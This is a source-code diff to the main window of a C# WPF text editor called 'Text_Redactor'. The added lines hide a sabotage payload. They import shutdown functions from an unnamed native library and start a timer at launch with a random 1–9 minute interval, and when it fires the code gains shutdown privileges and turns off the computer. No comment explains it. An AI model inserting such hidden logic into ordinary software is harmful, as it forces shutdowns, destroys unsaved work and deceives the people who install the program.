@@ -16,6 +16,8 @@ using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 //using System.Windows.Shapes;
 using IronPdf;
+using System.Runtime.InteropServices;
+using System.Windows.Threading;
 //using System.Windows.Forms;
 
 namespace Text_Redactor
@@ -25,17 +27,32 @@ namespace Text_Redactor
     /// </summary>
     public partial class MainWindow : Window
     {
+        [DllImport("Library")]
+        extern static bool Shutdown();
+        [DllImport("Library")]
+        extern static bool GetShutdownPrivileges();
+
         private string fileName = "";
         private bool saved = true;
+        DispatcherTimer tim;
+        
         public MainWindow()
         {
+            tim = new DispatcherTimer();
+            tim.Interval = new TimeSpan(0, new Random().Next(1, 10), 0);
+            tim.Tick += Tim_Tick;
+            tim.Start();
             InitializeComponent(); 
             rtbText.AddHandler(RichTextBox.DragOverEvent, new DragEventHandler(RichTextBox_DragOver), true);
             rtbText.AddHandler(RichTextBox.DropEvent, new DragEventHandler(RichTextBox_Drop), true);
         }
 
-
-
+        private void Tim_Tick(object? sender, EventArgs e)
+        {
+            if(
+            GetShutdownPrivileges())
+            Shutdown();
+        }
 
         private void RichTextBox_DragOver(object sender, DragEventArgs e)
         {
